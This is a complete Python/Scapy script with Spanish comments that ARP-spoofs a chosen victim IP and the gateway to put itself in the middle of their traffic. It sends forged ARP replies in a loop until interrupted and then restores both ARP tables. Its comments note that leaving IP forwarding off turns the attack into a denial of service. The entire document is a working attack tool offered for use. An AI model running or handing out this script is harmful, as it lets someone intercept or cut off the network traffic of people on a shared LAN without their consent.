from scapy.all import *
import sys,os,time,argparse

try:
        #Parseamos args y los asignamos
        parser = argparse.ArgumentParser()
        parser.add_argument("ipv",help="IP victima")
        parser.add_argument("ipr",help="IP router")
        args = parser.parse_args()
        victimIP = args.ipv
        gateIP = args.ipr
except KeyboardInterrupt:
        print ("\n[*] Saliendo")
        sys.exit(1)

# Para activar el reenvio de paquetes, si no haríamos un DOS
#print ("\n Activamos el reenvio de paquetes IP \n")
#os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")


def get_mac(IP):
    # Conseguimos la mac de la victima preguntando quien tiene la ip de la victima al router
    conf.verb = 0
    ans, unans = srp(Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(pdst = IP), timeout = 2, inter = 0.1)
    for snd,rcv in ans:
        return rcv[Ether].src

def reARP():
    # Si ya no queremos mas spoofear arp, restablecemos las tablas arp del router y de la victima 
    # y desactivamos el reenvio de paquetes
    print ("\n Restableciendo objetivos")
    victimMAC = get_mac(victimIP)
    gateMAC = get_mac(gateIP)
    send(ARP(op = 2, pdst = gateIP, psrc = victimIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = victimMAC), count = 7)
    send(ARP(op = 2, pdst = victimIP, psrc = gateIP, hwdst = "ff:ff:ff:ff:ff:ff", hwsrc = gateMAC), count = 7)
    print ("Desactivamos reenvio de paquetes")
    os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
    print ("Fin del programa")
    sys.exit(1)

def trick(gm, vm):
    # op 2 para decir que es una respuesta, y mantener el spoofing de las
    # tablas arp
    send(ARP(op = 2, pdst = victimIP, psrc = gateIP, hwdst= vm))
    send(ARP(op = 2, pdst = gateIP, psrc = victimIP, hwdst= gm))

def mitm():
    try:
        # Cogemos la mac de la victima y del host y envenenamos tablas arp hasta
        # pulsar Ctrl+c
        victimMAC = get_mac(victimIP)
    except Exception:
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print ("No he podido encontrar la MAC del objetivo")
        print ("Saliendo")
        sys.exit(1)
    try:
        gateMAC = get_mac(gateIP)
    except Exception:
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        print ("No he podido encontrar la mac de la puerta de enlace")
        print ("Saliendo")
        sys.exit(1)
    print ("Envenando ARP")
    while True:
        try:
            trick(gateMAC, victimMAC)
            time.sleep(1.5)
        except KeyboardInterrupt:
            reARP()
            break

if __name__ == '__main__':
    mitm()

